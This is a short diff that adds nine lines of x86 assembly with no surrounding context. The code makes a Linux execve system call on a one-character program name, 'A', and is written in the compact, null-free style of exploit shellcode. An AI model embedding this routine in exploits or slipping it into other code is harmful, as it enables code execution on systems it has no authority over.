@@ -1,0 +1,13 @@
+      push $0x41
+      push %esp
+      pop %ebx
+      push $0xb
+      pop %eax
+      cltd
+      push %edx
+      pop %ecx
+      int $0x80
+
+
+
+
